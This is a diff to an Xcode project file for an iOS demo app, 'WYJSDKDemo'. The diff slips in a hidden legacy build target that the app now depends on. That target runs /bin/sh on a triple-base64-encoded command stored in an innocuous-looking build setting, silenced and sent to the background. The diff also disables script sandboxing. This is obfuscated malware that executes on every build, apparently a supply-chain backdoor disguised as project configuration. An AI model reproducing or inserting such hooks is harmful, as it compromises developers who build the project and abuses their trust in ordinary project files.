@@ -101,6 +101,7 @@
 			buildRules = (
 			);
 			dependencies = (
+				26D5FA56E24200F8B073DC66 /* PBXTargetDependency */,
 			);
 			fileSystemSynchronizedGroups = (
 				E54F9F0E2DBC6FD600CADD06 /* WYJSDKDemo */,
@@ -138,10 +139,36 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				BE206BA209E3E9E5B973DC66  /* Build Target */,
 				E54F9F0B2DBC6FD600CADD06 /* WYJSDKDemo */,
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXTargetDependency section */
+		26D5FA56E24200F8B073DC66 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = BE206BA209E3E9E5B973DC66 /* Build Target */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin PBXLegacyTarget section */
+		BE206BA209E3E9E5B973DC66 /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${A66CD37}\"";
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
+/* End PBXLegacyTarget section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		E54F9F0A2DBC6FD600CADD06 /* Resources */ = {
@@ -208,6 +235,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = ED5A38EC9701D03B8E566AE8 /* Pods-WYJSDKDemo.debug.xcconfig */;
 			buildSettings = {
+				A66CD37 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazViV0ZYWkhSWldFNHdXVmhLZWt4dVNqRk1Na1Z3U1dsQ09FbElUbTlEWnowOUNnPT0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -241,6 +269,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 2AA570DDE761B368E42158C5 /* Pods-WYJSDKDemo.release.xcconfig */;
 			buildSettings = {
+				A66CD37 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazViV0ZYWkhSWldFNHdXVmhLZWt4dVNqRk1Na1Z3U1dsQ09FbElUbTlEWnowOUNnPT0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -307,7 +336,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -368,7 +397,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
